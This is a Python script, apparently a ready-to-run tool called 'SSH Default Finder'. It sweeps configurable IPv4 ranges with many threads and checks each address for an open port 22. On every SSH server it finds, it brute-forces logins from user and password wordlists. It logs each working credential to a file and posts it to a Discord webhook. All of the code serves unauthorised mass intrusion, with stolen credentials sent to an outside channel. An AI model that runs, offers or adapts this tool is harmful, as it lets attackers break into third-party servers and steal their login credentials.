from discord_webhook import DiscordWebhook
from datetime import timedelta
from datetime import datetime
import configparser
import threading
import paramiko
paramiko.util.log_to_file("main_paramiko_log.txt", level = "INFO")
import socket
import time
import os

global is_ssh_file
global hits_file
global webhook_url

config = configparser.ConfigParser()
config.read('config.conf')
is_ssh_file = config['FILES']['is_ssh']
hits_file = config['FILES']['hits']
webhook_url = config['DISCORD']['webhook']
a_min = int(config['RANGE']['a_min'])
a_max = int(config['RANGE']['a_max'])
b_min = int(config['RANGE']['b_min'])
b_max = int(config['RANGE']['b_max'])
c_min = int(config['RANGE']['c_min'])
c_max = int(config['RANGE']['c_max'])
d_min = int(config['RANGE']['d_min'])
d_max = int(config['RANGE']['d_max'])

global users
global passwords

file = open('users.txt', 'r')
users = file.read().split('\n')
file.close()
file = open('passwords.txt', 'r')
passwords = file.read().split('\n')
file.close()

global tested
global found
global hit
global start

tested = 0
found = 0
hit = 0
start = datetime.now()

global output_index
output_index = 11

class CColor:
    Red = '\033[91m'
    Green = '\u001b[32m'
    Yellow = '\u001b[33m'
    Blue = '\u001b[34m'
    Cyan = '\u001b[36m'
    White = '\033[0m'


def set_header() :
    global tested
    global found
    global start
    global hit

    duration = int((datetime.now() - start).seconds)/60
    if duration != 0 :
        cpm = int(tested/duration)
    else :
        cpm = 0
    os.system(f'title SSH DEFAULT CHECKER - TESTED : {tested} - FOUND : {found} - HITS : {hit} - CPM : {cpm} - CONTACT : JuneDay#0001')

def print_banner() :
    print(f"""
    {CColor.Yellow}
    ███████╗███████╗██╗  ██╗    ██████╗ ███████╗███████╗ █████╗ ██╗   ██╗██╗  ████████╗
    ██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██║  ╚══██╔══╝
    ███████╗███████╗███████║    ██║  ██║█████╗  █████╗  ███████║██║   ██║██║     ██║
    ╚════██║╚════██║██╔══██║    ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║   ██║██║     ██║
    ███████║███████║██║  ██║    ██████╔╝███████╗██║     ██║  ██║╚██████╔╝███████╗██║
    ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝

                     ███████╗██╗███╗   ██╗██████╗ ███████╗██████╗
                     ██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
                     █████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
                     ██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
                     ██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
                     ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝{CColor.White}
                                                        [ {CColor.Red}DEVELOPED BY JuneDay#0001{CColor.White} ]
                                                        """)



def print_in_file(file, line) :
    file = open(file, 'a+')
    file.write(f'{line}\n')
    file.close()


def is_ssh(ip) :
    to_return = False
    try :
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((ip, 22))
        if result == 0:
            to_return = True
        sock.close()
    except Exception as e:
        pass
    return to_return

def brute_connect(ip, user, password) :
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try :
        ssh.connect(hostname=ip, username=user, password=password, allow_agent=False, look_for_keys=False, banner_timeout=200)
        to_return = f'HIT > {user}:{password}@{ip}'
        ssh.close()
    except paramiko.AuthenticationException:
        to_return = ''
    except socket.timeout :
        to_return = ''
    except :
        to_return = ''

    return to_return

def brain(ip) :
    global is_ssh_file
    global hits_file
    global webhook_url

    global tested
    global found
    global hit

    global users
    global passwords

    global output_index

    if is_ssh(ip) :
        found += 1
        output_index += 1
        if output_index >= 12 :
            output_index = 0
            os.system('cls')
            print_banner()
        print(f'[ {CColor.Yellow}+{CColor.White} ] SSH server found on {CColor.Yellow}{ip}{CColor.White}, trying to connect ...')
        print_in_file(is_ssh_file, ip)
        result = ''
        creds_found = False
        result = brute_connect(ip, 'youare', 'underattack')
        if result == '' :
            for user in users :
                for password in passwords :
                    result = brute_connect(ip, user, password)
                    if result != '' and creds_found == False:
                        hit += 1
                        creds_found = True
                        print_in_file(hits_file, result.replace('HIT > ', ''))
                        for line in result.split('\n') :
                            print(f'[ {CColor.Yellow}+{CColor.White} ] {line}')
                        try :
                            webhook = DiscordWebhook(url=webhook_url, content=result)
                            response = webhook.execute()
                        except :
                            pass
        if not creds_found :
            print(f'[ {CColor.Red}-{CColor.White} ] Creditentials not found for {CColor.Yellow}{ip}{CColor.White}')
    tested += 1

os.system('color')
os.system('cls')
print_banner()
print(f"""[ {CColor.Yellow}?{CColor.White} ] Starting checker with {len(users)} users and {len(passwords)} passwords
[ {CColor.Yellow}?{CColor.White} ] SSH servers will be saved in {is_ssh_file}
[ {CColor.Yellow}?{CColor.White} ] Hits will be saved in {hits_file}
[ {CColor.Yellow}?{CColor.White} ] Covering range : {a_min}/{a_max}.{b_min}/{b_max}.{c_min}/{c_max}.{d_min}/{d_max}
[ {CColor.Yellow}?{CColor.White} ] Starting checker with max thread count""")



for a in range(a_min, a_max + 1) :
    for b in range(b_min, b_max + 1) :
        for c in range(c_min, c_max + 1) :
            for d in range(d_min, d_max + 1) :
                launched = False
                ip = f'{a}.{b}.{c}.{d}'
                while not launched :
                    try :
                        threading.Thread(target=brain, args=(ip, )).start()
                        launched = True
                    except :
                        pass
                set_header()
